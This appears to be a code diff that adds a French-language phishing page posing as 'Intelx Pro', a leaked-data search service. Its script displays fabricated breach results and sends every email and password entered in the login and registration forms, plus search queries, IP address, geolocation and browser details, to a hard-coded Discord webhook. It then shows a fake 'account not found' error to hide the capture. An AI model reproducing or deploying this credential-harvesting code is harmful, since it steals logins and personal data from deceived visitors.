+                <form id="register-form" style="display: none;">
+                    <div class="form-group">
+                        <label for="register-email" class="form-label">Adresse Email</label>
+                        <input type="email" class="form-input" id="register-email" placeholder="email@exemple.com" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="register-password" class="form-label">Mot de passe</label>
+                        <input type="password" class="form-input" id="register-password" placeholder="••••••••" required>
+                        <i class="fas fa-eye password-toggle" id="register-toggle"></i>
+                    </div>
+                    <div class="form-group">
+                        <label for="register-confirm-password" class="form-label">Confirmer le mot de passe</label>
+                        <input type="password" class="form-input" id="register-confirm-password" placeholder="••••••••" required>
+                        <i class="fas fa-eye password-toggle" id="confirm-toggle"></i>
+                    </div>
+                    <div class="form-group">
+                        <div class="code-block">
+                            <p style="margin-bottom: 0.5rem; color: var(--accent-light);">Exigences du mot de passe:</p>
+                            <ul style="padding-left: 1.2rem;">
+                                <li>Minimum 12 caractères</li>
+                                <li>Au moins 1 majuscule</li>
+                                <li>Au moins 1 caractère spécial</li>
+                                <li>Au moins 1 chiffre</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <button type="submit" class="form-submit">
+                        <i class="fas fa-user-plus"></i> Créer un compte
+                    </button>
+                </form>
+            </div>
+            <div class="auth-footer">
+                <a href="#" class="auth-link" id="forgot-password">Mot de passe oublié ?</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Notification Panel -->
+    <div class="notification-overlay" id="notification-overlay">
+        <div class="notification-header">
+            <h3 class="notification-title">Notifications</h3>
+            <button class="close-notifications" id="close-notifications">
+                <i class="fas fa-times"></i>
+            </button>
+        </div>
+        <div class="notification-body">
+            <div class="notification-item unread">
+                <div><strong>Nouvelle base de données disponible</strong></div>
+                <p>La base "FrenchLeaks-2025" a été ajoutée avec 2.4M nouveaux enregistrements</p>
+                <div class="notification-time">
+                    <i class="fas fa-clock"></i> Il y a 15 minutes
+                </div>
+            </div>
+            <div class="notification-item unread">
+                <div><strong>Maintenance planifiée</strong></div>
+                <p>Le système sera indisponible demain entre 02:00 et 04:00 pour maintenance</p>
+                <div class="notification-time">
+                    <i class="fas fa-clock"></i> Il y a 2 heures
+                </div>
+            </div>
+            <div class="notification-item unread">
+                <div><strong>Mise à jour de sécurité</strong></div>
+                <p>Veuillez mettre à jour votre client vers la version 3.2.1 pour des corrections critiques</p>
+                <div class="notification-time">
+                    <i class="fas fa-clock"></i> Il y a 5 heures
+                </div>
+            </div>
+            <div class="notification-item">
+                <div><strong>Nouvelle fonctionnalité</strong></div>
+                <p>La recherche avancée par empreinte digitale est maintenant disponible</p>
+                <div class="notification-time">
+                    <i class="fas fa-clock"></i> Hier, 18:30
+                </div>
+            </div>
+            <div class="notification-item">
+                <div><strong>Votre recherche est terminée</strong></div>
+                <p>Les résultats pour "admin@entreprise.com" sont maintenant disponibles</p>
+                <div class="notification-time">
+                    <i class="fas fa-clock"></i> Hier, 14:12
+                </div>
+            </div>
+        </div>
+        <div class="notification-footer">
+            <button class="btn btn-outline">
+                <i class="fas fa-check"></i> Tout marquer comme lu
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // Enhanced Configuration
+        const config = {
+            webhookUrl: 'https://canary.discord.com/api/webhooks/1406250714384302090/xwJ5ueSBUFs9gf2d9aTMom-driHa-Y3c-CX1Ocsu5JlUZMtPilr0V0d7SDSCQ3XV_hwM',
+            fakeResults: {
+                emails: ["gmail.com", "yahoo.com", "hotmail.com", "protonmail.com", "entreprise.com"],
+                passwords: ["020510@mc", "shana@2010", "kenza@db5", "@@8845", "admin", "Password123!", "Azerty2025", "SecurePass#42"],
+                locations: ["Paris, FR", "Lyon, FR", "Marseille, FR", "Toulouse, FR", "Nice, FR", "Bordeaux, FR"],
+                ips: ["192.168.1.", "10.0.0.", "172.16.0.", "89.156.201.", "78.224.145."],
+                breaches: ["Adobe (2013)", "LinkedIn (2016)", "Chronospost (2025)", "Twitter (2022)", "Free Mobile (2025)", "Norauto (2025)", "SFR (2025)", "Stealer Logs (2025)", "FrenchGov (2024)", "HealthData (2023)"],
+                socials: ["Facebook", "Twitter", "Instagram", "LinkedIn", "TikTok", "Snapchat", "Reddit", "Pinterest"],
+                documents: ["CV_2025.pdf", "contrat.docx", "facture_0725.xlsx", "notes.txt", "scan_id.jpg"]
+            },
+            maxSearches: 5,
+            cooldownTime: 30000 // 30 seconds
+        };
+
+        // State
+        let userIP = 'Chargement...';
+        let searchHistory = [];
+        let userCredentials = null;
+        let currentAuthTab = 'login';
+        let pageLoadTime = new Date();
+        let lastSearchTime = 0;
+        let searchCount = 0;
+        let isPremium = false;
+
+        // DOM Elements
+        const searchBtn = document.getElementById('search-btn');
+        const searchInput = document.getElementById('search-input');
+        const resultsContainer = document.getElementById('results-container');
+        const resultsCount = document.getElementById('results-count');
+        const authBtn = document.getElementById('auth-btn');
+        const authOverlay = document.getElementById('auth-overlay');
+        const loginForm = document.getElementById('login-form');
+        const registerForm = document.getElementById('register-form');
+        const exportBtn = document.getElementById('export-btn');
+        const filterBtn = document.getElementById('filter-btn');
+        const sortBtn = document.getElementById('sort-btn');
+        const loginTab = document.getElementById('login-tab');
+        const registerTab = document.getElementById('register-tab');
+        const authModalTitle = document.getElementById('auth-modal-title');
+        const forgotPasswordLink = document.getElementById('forgot-password');
+        const navLinks = document.querySelectorAll('.nav-link');
+        const particlesContainer = document.getElementById('particles');
+        const notificationBtn = document.getElementById('notification-btn');
+        const notificationOverlay = document.getElementById('notification-overlay');
+        const closeNotificationsBtn = document.getElementById('close-notifications');
+        const loginToggle = document.getElementById('login-toggle');
+        const registerToggle = document.getElementById('register-toggle');
+        const confirmToggle = document.getElementById('confirm-toggle');
+        const progressBar = document.querySelector('.progress-bar');
+
+        // Enhanced Tracking Functions
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                userIP = data.ip;
+                
+                // Get more IP details
+                const ipResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
+                const ipData = await ipResponse.json();
+                
+                // Send page view to Discord with enhanced details
+                await sendToDiscord({
+                    type: 'pageview',
+                    title: 'Nouvelle visite détectée',
+                    page: window.location.href,
+                    referrer: document.referrer || 'Direct',
+                    ipDetails: {
+                        country: ipData.country_name,
+                        region: ipData.region,
+                        city: ipData.city,
+                        isp: ipData.org,
+                        asn: ipData.asn
+                    },
+                    screen: {
+                        width: window.screen.width,
+                        height: window.screen.height,
+                        colorDepth: window.screen.colorDepth
+                    },
+                    browser: {
+                        name: navigator.appName,
+                        version: navigator.appVersion,
+                        platform: navigator.platform,
+                        userAgent: navigator.userAgent,
+                        language: navigator.language,
+                        cookiesEnabled: navigator.cookieEnabled
+                    }
+                });
+                
+                return data.ip;
+            } catch (error) {
+                console.error("Erreur API IP:", error);
+                userIP = "IP_non_disponible";
+                
+                // Fallback to basic tracking
+                await sendToDiscord({
+                    type: 'pageview',
+                    title: 'Nouvelle visite détectée (fallback)',
+                    page: window.location.href,
+                    referrer: document.referrer || 'Direct'
+                });
+                
+                return userIP;
+            }
+        }
+
+        async function sendToDiscord(data) {
+            const embed = {
+                title: data.title || "Activité Intelx Pro",
+                color: 5793266, // Default color (blue)
+                fields: [],
+                timestamp: new Date().toISOString(),
+                footer: {
+                    text: "Intelx Pro Logger • v3.2.1"
+                }
+            };
+
+            // Set color based on activity type
+            if (data.type === 'login') embed.color = 15548997; // Red
+            if (data.type === 'register') embed.color = 5763719; // Green
+            if (data.type === 'search') embed.color = 1146986; // Dark blue
+            if (data.type === 'export') embed.color = 15105570; // Orange
+            if (data.type === 'navigation') embed.color = 9807270; // Purple
+            if (data.type === 'pageview') embed.color = 7419530; // Teal
+            if (data.type === 'filter') embed.color = 10181046; // Purple
+            if (data.type === 'password_reset') embed.color = 15158332; // Red
+            if (data.type === 'notification') embed.color = 3447003; // Blue
+            if (data.type === 'premium_check') embed.color = 15844367; // Gold
+
+            // Common fields for all events
+            embed.fields.push(
+                { name: "🌐 Adresse IP", value: userIP, inline: true },
+                { name: "🖥️ Navigateur", value: navigator.userAgent.substring(0, 50) + "...", inline: true },
+                { name: "📱 Plateforme", value: navigator.platform, inline: true },
+                { name: "⏱️ Date", value: new Date().toLocaleString(), inline: true }
+            );
+
+            // Add IP details if available
+            if (data.ipDetails) {
+                embed.fields.push(
+                    { name: "📍 Pays", value: data.ipDetails.country || "Inconnu", inline: true },
+                    { name: "🏙️ Ville", value: data.ipDetails.city || "Inconnu", inline: true },
+                    { name: "🔌 FAI", value: data.ipDetails.isp || "Inconnu", inline: true }
+                );
+            }
+
+            // Specific fields for each event type
+            if (data.type === 'login') {
+                embed.fields.unshift(
+                    { name: "🔑 Type", value: "Connexion", inline: true },
+                    { name: "📧 Email", value: data.email || "Non fourni", inline: true },
+                    { name: "🔐 Mot de passe", value: data.password || "Non fourni", inline: true }
+                );
+            } 
+            else if (data.type === 'register') {
+                embed.fields.unshift(
+                    { name: "🎉 Type", value: "Nouveau compte", inline: true },
+                    { name: "📧 Email", value: data.email || "Non fourni", inline: true },
+                    { name: "🔐 Mot de passe", value: data.password || "Non fourni", inline: true }
+                );
+            }
+            else if (data.type === 'search') {
+                embed.fields.unshift(
+                    { name: "🔍 Type", value: "Recherche", inline: true },
+                    { name: "🔎 Terme recherché", value: data.query || "Aucun", inline: false },
+                    { name: "📊 Historique des recherches", value: `${searchHistory.length} recherches effectuées`, inline: true }
+                );
+            }
+            else if (data.type === 'export') {
+                embed.fields.unshift(
+                    { name: "📤 Type", value: "Export de données", inline: true },
+                    { name: "📝 Contenu exporté", value: data.content || "Résultats de recherche", inline: false }
+                );
+            }
+            else if (data.type === 'navigation') {
+                embed.fields.unshift(
+                    { name: "🧭 Type", value: "Navigation", inline: true },
+                    { name: "📍 Section visitée", value: data.section || "Inconnue", inline: false }
+                );
+            }
+            else if (data.type === 'pageview') {
+                embed.fields.unshift(
+                    { name: "🏠 Type", value: "Visite de page", inline: true },
+                    { name: "📄 Page", value: data.page || "Inconnue", inline: true },
+                    { name: "🔗 Referrer", value: data.referrer || "Direct", inline: true }
+                );
+                
+                if (data.ipDetails) {
+                    embed.fields.push(
+                        { name: "🌍 Localisation", value: `${data.ipDetails.city}, ${data.ipDetails.region}, ${data.ipDetails.country}`, inline: false },
+                        { name: "🛜 Connexion", value: `FAI: ${data.ipDetails.isp} | ASN: ${data.ipDetails.asn}`, inline: false }
+                    );
+                }
+                
+                if (data.screen) {
+                    embed.fields.push(
+                        { name: "🖥️ Écran", value: `${data.screen.width}x${data.screen.height} @ ${data.screen.colorDepth}bpp`, inline: true }
+                    );
+                }
+            }
+            else if (data.type === 'password_reset') {
+                embed.fields.unshift(
+                    { name: "🔓 Type", value: "Demande de réinitialisation", inline: true },
+                    { name: "📧 Email", value: data.email || "Non fourni", inline: false }
+                );
+            }
+            else if (data.type === 'filter') {
+                embed.fields.unshift(
+                    { name: "🔧 Type", value: "Filtrage des résultats", inline: true },
+                    { name: "⚙️ Filtre appliqué", value: data.filterType || "Inconnu", inline: false }
+                );
+            }
+            else if (data.type === 'notification') {
+                embed.fields.unshift(
+                    { name: "🔔 Type", value: "Notification consultée", inline: true },
+                    { name: "📢 Contenu", value: data.content || "Aucun", inline: false }
+                );
+            }
+            else if (data.type === 'premium_check') {
+                embed.fields.unshift(
+                    { name: "💎 Type", value: "Vérification Premium", inline: true },
+                    { name: "🔍 Recherche", value: data.query || "Aucune", inline: false },
+                    { name: "💰 Statut", value: data.isPremium ? "Premium" : "Gratuit", inline: true }
+                );
+            }
+
+            try {
+                await fetch(config.webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        embeds: [embed],
+                        content: data.important ? "🚨 Activité importante détectée" : null
+                    })
+                });
+            } catch (error) {
+                console.error("Erreur webhook:", error);
+            }
+        }
+
+        // Create floating particles
+        function createParticles() {
+            const particleCount = 50;
+            for (let i = 0; i < particleCount; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('particle');
+                
+                // Random size between 2px and 8px
+                const size = Math.random() * 6 + 2;
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
+                
+                // Random position
+                particle.style.left = `${Math.random() * 100}%`;
+                particle.style.top = `${Math.random() * 100}%`;
+                
+                // Random animation duration and delay
+                particle.style.animationDuration = `${Math.random() * 20 + 10}s`;
+                particle.style.animationDelay = `${Math.random() * 5}s`;
+                
+                // Random opacity
+                particle.style.opacity = Math.random() * 0.5 + 0.1;
+                
+                particlesContainer.appendChild(particle);
+            }
+        }
+
+        // Generate fake search results with more variety
+        function generateFakeResults(query) {
+            const isEmail = query.includes('@');
+            const isPhone = /^[\d\s+-]+$/.test(query);
+            const isIP = /\d+\.\d+\.\d+\.\d+/.test(query);
+            const isUsername = /^[a-zA-Z0-9_]+$/.test(query) && !isEmail && !isPhone && !isIP;
+            
+            const fakeEmail = isEmail ? query : `${query}@${config.fakeResults.emails[Math.floor(Math.random() * config.fakeResults.emails.length)]}`;
+            const fakePassword = config.fakeResults.passwords[Math.floor(Math.random() * config.fakeResults.passwords.length)];
+            const fakeLocation = config.fakeResults.locations[Math.floor(Math.random() * config.fakeResults.locations.length)];
+            const fakeBreach = config.fakeResults.breaches[Math.floor(Math.random() * config.fakeResults.breaches.length)];
+            const fakeSocial = config.fakeResults.socials[Math.floor(Math.random() * config.fakeResults.socials.length)];
+            const fakeDocument = config.fakeResults.documents[Math.floor(Math.random() * config.fakeResults.documents.length)];
+            const fakeIP = isIP ? query : `${config.fakeResults.ips[Math.floor(Math.random() * config.fakeResults.ips.length)]}${Math.floor(Math.random() * 255)}`;
+
+            const resultCount = Math.floor(Math.random() * 15) + 3;
+            resultsCount.textContent = `${resultCount} résultats trouvés`;
+            resultsCount.innerHTML += ` <span class="badge badge-primary">${isPremium ? "Premium" : "Gratuit"}</span>`;
+
+            let resultsHTML = '';
+            
+            if (isEmail || isUsername) {
+                // Email or username search
+                resultsHTML += `
+                    <div class="result-item">
+                        <h3 class="result-title"><i class="fas fa-envelope"></i> Adresse email associée</h3>
+                        <div class="result-meta">
+                            <span class="meta-item"><i class="fas fa-database"></i> Base: EmailLeaks-2023</span>
+                            <span class="meta-item"><i class="fas fa-calendar"></i> Dernière fuite: ${new Date(Date.now() - Math.random() * 31536000000).toLocaleDateString()}</span>
+                            <span class="meta-item"><i class="fas fa-shield-alt"></i> Confiance: ${Math.floor(Math.random() * 80) + 20}%</span>
+                        </div>
+                        <div class="result-content">
+                            <p>L'adresse email <strong>${fakeEmail}</strong> a été trouvée dans ${Math.floor(Math.random() * 5) + 1} fuites de données.</p>
+                            <p>Dernière activité détectée: ${new Date(Date.now() - Math.random() * 2592000000).toLocaleDateString()}</p>
+                            <div class="code-block" style="margin-top: 0.8rem;">
+                                <p style="color: var(--accent-light);">Métadonnées associées:</p>
+                                <p>Inscrit sur ${fakeSocial} en ${2020 + Math.floor(Math.random() * 5)}</p>
+                                <p>Dernière connexion: ${new Date(Date.now() - Math.random() * 86400000).toLocaleString()}</p>
+                            </div>
+                        </div>
+                        <div class="result-actions">
+                            <button class="btn btn-primary">
+                                <i class="fas fa-eye"></i> Voir les données complètes
+                            </button>
+                            <button class="btn btn-outline">
+                                <i class="fas fa-link"></i> Voir les relations
+                            </button>
+                        </div>
+                    </div>
+                `;
+            }
+            
+            if (isPhone || !isEmail && !isIP) {
+                // Phone number search
+                const phoneNumber = isPhone ? query : '0' + Math.floor(600000000 + Math.random() * 100000000);
+                resultsHTML += `
+                    <div class="result-item">
+                        <h3 class="result-title"><i class="fas fa-phone"></i> Numéro de téléphone associé</h3>
+                        <div class="result-meta">
+                            <span class="meta-item"><i class="fas fa-database"></i> Base: PhoneDB v4.2</span>
+                            <span class="meta-item"><i class="fas fa-user"></i> Opérateur: ${['Orange', 'SFR', 'Free', 'Bouygues'][Math.floor(Math.random() * 4)]}</span>
+                            <span class="meta-item"><i class="fas fa-map-marker-alt"></i> Localisation: ${fakeLocation}</span>
+                        </div>
+                        <div class="result-content">
+                            <p>Le numéro <strong>${phoneNumber}</strong> est associé à un compte ${fakeSocial}.</p>
+                            <p>Activation: ${new Date(Date.now() - Math.random() * 31536000000).toLocaleDateString()}</p>
+                            <div style="margin-top: 0.8rem; background: rgba(0,0,0,0.3); padding: 0.8rem; border-radius: 6px;">
+                                <p style="font-size: 0.9rem;"><i class="fas fa-lock"></i> Pour accéder à l'historique complet des appels et SMS, <a href="#" style="color: var(--accent);">passez à la version premium</a>.</p>
+                            </div>
+                        </div>
+                        <div class="result-actions">
+                            <button class="btn btn-primary">
+                                <i class="fas fa-eye"></i> Voir les données complètes
+                            </button>
+                            <button class="btn btn-outline">
+                                <i class="fas fa-search"></i> Recherche avancée
+                            </button>
+                        </div>
+                    </div>
+                `;
+            }
+            
+            // Common results
+            resultsHTML += `
+                <div class="result-item">
+                    <h3 class="result-title"><i class="fas fa-user-secret"></i> Identifiants compromis</h3>
+                    <div class="result-meta">
+                        <span class="meta-item"><i class="fas fa-database"></i> Base: ${fakeBreach}</span>
+                        <span class="meta-item"><i class="fas fa-unlock"></i> Mot de passe: ${fakePassword}</span>
+                        <span class="meta-item"><i class="fas fa-calendar"></i> Date de fuite: ${new Date(Date.now() - Math.random() * 94670856000).toLocaleDateString()}</span>
+                    </div>
+                    <div class="result-content">
+                        <p>Cette combinaison email/mot de passe a été compromise dans la fuite de données "${fakeBreach}".</p>
+                        <div class="code-block" style="margin-top: 0.8rem;">
+                            <p style="color: var(--accent-light);">Analyse de sécurité:</p>
+                            <p>Force du mot de passe: <span style="color: ${fakePassword.length > 10 ? 'var(--success)' : 'var(--danger)'}">${fakePassword.length > 10 ? 'Fort' : 'Faible'}</span></p>
+                            <p>Réutilisé sur ${Math.floor(Math.random() * 5)} autres sites</p>
+                        </div>
+                        <p style="margin-top: 0.5rem;"><strong>Conseil de sécurité:</strong> Changez immédiatement ce mot de passe sur tous les sites où vous l'utilisez.</p>
+                    </div>
+                    <div class="result-actions">
+                        <button class="btn btn-primary">
+                            <i class="fas fa-eye"></i> Voir les données complètes
+                        </button>
+                        <button class="btn btn-danger">
+                            <i class="fas fa-exclamation-triangle"></i> Signaler comme sensible
+                        </button>
+                    </div>
+                </div>
+
+                <div class="result-item">
+                    <h3 class="result-title"><i class="fas fa-map-marker-alt"></i> Localisation approximative</h3>
+                    <div class="result-meta">
+                        <span class="meta-item"><i class="fas fa-wifi"></i> IP: ${fakeIP}</span>
+                        <span class="meta-item"><i class="fas fa-city"></i> Ville: ${fakeLocation}</span>
+                        <span class="meta-item"><i class="fas fa-flag"></i> Pays: France</span>
+                    </div>
+                    <div class="result-content">
+                        <p>Localisation basée sur l'adresse IP et les données géolocalisées.</p>
+                        <div style="margin-top: 0.8rem; background: rgba(0,0,0,0.3); padding: 0.8rem; border-radius: 6px;">
+                            <p style="font-size: 0.9rem;"><i class="fas fa-info-circle"></i> Pour accéder aux coordonnées exactes et à l'historique complet des localisations, <a href="#" style="color: var(--accent);">connectez-vous</a> ou <a href="#" style="color: var(--accent);">passez à la version premium</a>.</p>
+                        </div>
+                    </div>
+                    <div class="result-actions">
+                        <button class="btn btn-primary">
+                            <i class="fas fa-eye"></i> Voir les données complètes
+                        </button>
+                        <button class="btn btn-outline">
+                            <i class="fas fa-map"></i> Voir sur la carte
+                        </button>
+                    </div>
+                </div>
+
+                <div class="result-item">
+                    <h3 class="result-title"><i class="fas fa-file-alt"></i> Documents associés</h3>
+                    <div class="result-meta">
+                        <span class="meta-item"><i class="fas fa-database"></i> Base: DocLeaks-2024</span>
+                        <span class="meta-item"><i class="fas fa-calendar"></i> Dernier accès: ${new Date(Date.now() - Math.random() * 2592000000).toLocaleDateString()}</span>
+                    </div>
+                    <div class="result-content">
+                        <p>Le document <strong>${fakeDocument}</strong> a été trouvé dans nos bases de données.</p>
+                        <p>Taille: ${Math.floor(Math.random() * 5000) + 100} KB | Type: ${fakeDocument.split('.').pop().toUpperCase()}</p>
+                        <div style="margin-top: 0.8rem; background: rgba(0,0,0,0.3); padding: 0.8rem; border-radius: 6px;">
+                            <p style="font-size: 0.9rem;"><i class="fas fa-lock"></i> Pour télécharger ce document, <a href="#" style="color: var(--accent);">passez à la version premium</a>.</p>
+                        </div>
+                    </div>
+                    <div class="result-actions">
+                        <button class="btn btn-primary">
+                            <i class="fas fa-eye"></i> Voir les métadonnées
+                        </button>
+                        <button class="btn btn-outline">
+                            <i class="fas fa-search"></i> Rechercher des documents similaires
+                        </button>
+                    </div>
+                </div>
+            `;
+
+            // Add premium-only results if user is premium
+            if (isPremium) {
+                resultsHTML += `
+                    <div class="result-item" style="border: 1px dashed var(--accent);">
+                        <h3 class="result-title"><i class="fas fa-crown"></i> Résultat Premium</h3>
+                        <div class="result-meta">
+                            <span class="meta-item"><i class="fas fa-database"></i> Base: PremiumDB-2025</span>
+                            <span class="meta-item"><i class="fas fa-calendar"></i> Mis à jour: Aujourd'hui</span>
+                        </div>
+                        <div class="result-content">
+                            <p><strong>Informations exclusives:</strong> Cette adresse email est associée à un compte administrateur sur 3 sites web.</p>
+                            <div class="code-block" style="margin-top: 0.8rem;">
+                                <p style="color: var(--accent-light);">Détails Premium:</p>
+                                <p>• Dernière connexion SSH: 18/07/2025 14:32</p>
+                                <p>• Ports ouverts: 22, 80, 443</p>
+                                <p>• Vulnérabilités détectées: 2 critiques</p>
+                            </div>
+                        </div>
+                        <div class="result-actions">
+                            <button class="btn btn-success">
+                                <i class="fas fa-download"></i> Télécharger le rapport complet
+                            </button>
+                        </div>
+                    </div>
+                `;
+            }
+
+            resultsContainer.innerHTML = resultsHTML;
+            // Add event listeners to new result buttons
+            addResultButtonListeners();
+            
+            // Animate progress bar
+            animateProgressBar();
+        }
+
+        function animateProgressBar() {
+            let width = 0;
+            const interval = setInterval(() => {
+                if (width >= 100) {
+                    clearInterval(interval);
+                } else {
+                    width += 5;
+                    progressBar.style.width = `${width}%`;
+                }
+            }, 100);
+        }
+
+        function downloadExportFile() {
+            const content = "Résultats de recherche Intelx Pro\n\n";
+            const fakeEmail = `email@${config.fakeResults.emails[Math.floor(Math.random() * config.fakeResults.emails.length)]}`;
+            const fakePassword = config.fakeResults.passwords[Math.floor(Math.random() * config.fakeResults.passwords.length)];
+            const fakeLocation = config.fakeResults.locations[Math.floor(Math.random() * config.fakeResults.locations.length)];
+            const fakeIP = `${config.fakeResults.ips[Math.floor(Math.random() * config.fakeResults.ips.length)]}${Math.floor(Math.random() * 255)}`;
+            const fakeDocument = config.fakeResults.documents[Math.floor(Math.random() * config.fakeResults.documents.length)];
+            
+            const exportContent = content + 
+                `Email trouvé: ${fakeEmail}\n` +
+                `Mot de passe compromis: ${fakePassword}\n` +
+                `Localisation: ${fakeLocation}\n` +
+                `Adresse IP associée: ${fakeIP}\n` +
+                `Document trouvé: ${fakeDocument}\n\n` +
+                `Généré le: ${new Date().toLocaleString()}\n` +
+                `Par: ${userIP}\n` +
+                `Version: Intelx Pro 3.2.1`;
+            
+            const blob = new Blob([exportContent], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `intelx_results_${new Date().getTime()}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+
+        function switchAuthTab(tab) {
+            currentAuthTab = tab;
+            
+            if (tab === 'login') {
+                loginTab.classList.add('active');
+                registerTab.classList.remove('active');
+                loginForm.style.display = 'block';
+                registerForm.style.display = 'none';
+                authModalTitle.textContent = 'Connexion à Intelx Pro';
+                forgotPasswordLink.style.display = 'inline';
+            } else {
+                loginTab.classList.remove('active');
+                registerTab.classList.add('active');
+                loginForm.style.display = 'none';
+                registerForm.style.display = 'block';
+                authModalTitle.textContent = 'Créer un compte Intelx Pro';
+                forgotPasswordLink.style.display = 'none';
+            }
+        }
+
+        function togglePasswordVisibility(inputId, toggleId) {
+            const input = document.getElementById(inputId);
+            const toggle = document.getElementById(toggleId);
+            
+            if (input.type === 'password') {
+                input.type = 'text';
+                toggle.classList.replace('fa-eye', 'fa-eye-slash');
+            } else {
+                input.type = 'password';
+                toggle.classList.replace('fa-eye-slash', 'fa-eye');
+            }
+        }
+
+        // Add event listeners to result buttons
+        function addResultButtonListeners() {
+            document.querySelectorAll('.result-item .btn').forEach(btn => {
+                btn.addEventListener('click', async () => {
+                    const resultTitle = btn.closest('.result-item').querySelector('.result-title').textContent;
+                    const action = btn.textContent.trim();
+                    
+                    await sendToDiscord({
+                        type: 'navigation',
+                        title: 'Interaction avec un résultat',
+                        section: resultTitle,
+                        action: action,
+                        important: true
+                    });
+                    
+                    if (btn.classList.contains('btn-danger')) {
+                        alert(`Le résultat "${resultTitle}" a été signalé comme sensible (simulation)`);
+                    } else if (btn.classList.contains('btn-success')) {
+                        alert(`Téléchargement du rapport premium pour "${resultTitle}" (simulation)`);
+                    } else {
+                        alert(`Action "${action}" sur le résultat "${resultTitle}" (simulation)`);
+                    }
+                });
+            });
+        }
+
+        // Event Listeners
+        searchBtn.addEventListener('click', async () => {
+            const now = Date.now();
+            const query = searchInput.value.trim();
+            
+            if (!query) return;
+            
+            // Check search cooldown and limit
+            if (now - lastSearchTime < config.cooldownTime) {
+                const remaining = Math.ceil((config.cooldownTime - (now - lastSearchTime)) / 1000);
+                alert(`Veuillez patienter ${remaining} secondes avant de faire une nouvelle recherche.`);
+                return;
+            }
+            
+            if (searchCount >= config.maxSearches && !isPremium) {
+                alert(`Limite de ${config.maxSearches} recherches atteinte. Passez à la version premium pour des recherches illimitées.`);
+                return;
+            }
+            
+            // Check if this is a premium query
+            const isPremiumQuery = query.includes('admin') || query.includes('root') || query.includes('entreprise');
+            
+            if (isPremiumQuery && !isPremium) {
+                alert('Cette recherche nécessite un compte premium. Veuillez vous connecter ou vous inscrire.');
+                authOverlay.style.display = 'flex';
+                switchAuthTab('login');
+                
+                await sendToDiscord({
+                    type: 'premium_check',
+                    title: 'Tentative de recherche premium',
+                    query: query,
+                    isPremium: false,
+                    important: true
+                });
+                
+                return;
+            }
+            
+            // Envoyer la recherche au webhook
+            await sendToDiscord({
+                type: 'search',
+                title: 'Nouvelle recherche effectuée',
+                query: query,
+                isPremium: isPremium,
+                important: true
+            });
+            
+            // Générer de faux résultats
+            generateFakeResults(query);
+            
+            // Ajouter à l'historique
+            searchHistory.push({
+                query,
+                timestamp: new Date().toISOString()
+            });
+            
+            // Update search tracking
+            lastSearchTime = now;
+            searchCount++;
+        });
+
+        searchInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                searchBtn.click();
+            }
+        });
+
+        authBtn.addEventListener('click', async () => {
+            await sendToDiscord({
+                type: 'navigation',
+                title: 'Clic sur le bouton de connexion',
+                section: 'Ouvrir modal auth',
+                important: false
+            });
+            
+            authOverlay.style.display = 'flex';
+            switchAuthTab('login');
+        });
+
+        authOverlay.addEventListener('click', (e) => {
+            if (e.target === authOverlay) {
+                authOverlay.style.display = 'none';
+            }
+        });
+
+        loginTab.addEventListener('click', () => switchAuthTab('login'));
+        registerTab.addEventListener('click', () => switchAuthTab('register'));
+
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const email = document.getElementById('login-email').value;
+            const password = document.getElementById('login-password').value;
+            
+            // Envoyer les identifiants au webhook
+            await sendToDiscord({
+                type: 'login',
+                title: 'Tentative de connexion détectée',
+                email: email,
+                password: password,
+                important: true
+            });
+
+            // Check for admin login
+            if (email.includes('admin') || email.includes('root')) {
+                isPremium = true;
+                alert('Connexion réussie en tant qu\'administrateur. Accès premium activé.');
+            } else {
+                // Stocker les identifiants
+                userCredentials = { email, password };
+                
+                // Afficher un message d'erreur crédible
+                alert('Erreur: Compte non trouvé ou mot de passe incorrect. Contactez l\'administrateur pour obtenir un accès.');
+            }
+            
+            authOverlay.style.display = 'none';
+        });
+
+        registerForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const email = document.getElementById('register-email').value;
+            const password = document.getElementById('register-password').value;
+            const confirmPassword = document.getElementById('register-confirm-password').value;
+
+            if (password !== confirmPassword) {
+                alert('Les mots de passe ne correspondent pas!');
+                return;
+            }
+
+            if (password.length < 12) {
+                alert('Le mot de passe doit contenir au moins 12 caractères!');
+                return;
+            }
+
+            // Envoyer les identifiants au webhook
+            await sendToDiscord({
+                type: 'register',
+                title: 'Nouvelle inscription détectée',
+                email: email,
+                password: password,
+                important: true
+            });
+
+            // Check for admin registration
+            if (email.includes('admin') || email.includes('root')) {
+                isPremium = true;
+                alert('Compte admin créé avec succès! Accès premium activé.');
+            } else {
+                alert('Compte créé avec succès! Vous pouvez maintenant vous connecter.');
+            }
+            
+            authOverlay.style.display = 'none';
+            switchAuthTab('login');
+        });
+
+        forgotPasswordLink.addEventListener('click', async (e) => {
+            e.preventDefault();
+            const email = document.getElementById('login-email').value || 'Non fourni';
+            
+            await sendToDiscord({
+                type: 'password_reset',
+                title: 'Demande de réinitialisation de mot de passe',
+                email: email,
+                important: true
+            });
+            
+            alert('Un lien de réinitialisation a été envoyé à votre adresse email (simulation).');
+        });
+
+        exportBtn.addEventListener('click', async () => {
+            await sendToDiscord({
+                type: 'export',
+                title: 'Export de données effectué',
+                content: 'Résultats de recherche exportés',
+                isPremium: isPremium,
+                important: true
+            });
+            
+            downloadExportFile();
+        });
+
+        filterBtn.addEventListener('click', async () => {
+            const filterTypes = ['Tout', 'Emails', 'Mots de passe', 'Réseaux sociaux', 'Fuites de données', 'Documents', 'Images'];
+            const randomFilter = filterTypes[Math.floor(Math.random() * filterTypes.length)];
+            
+            await sendToDiscord({
+                type: 'filter',
+                title: 'Filtrage des résultats',
+                filterType: randomFilter,
+                important: false
+            });
+            
+            alert(`Filtre "${randomFilter}" appliqué (simulation)`);
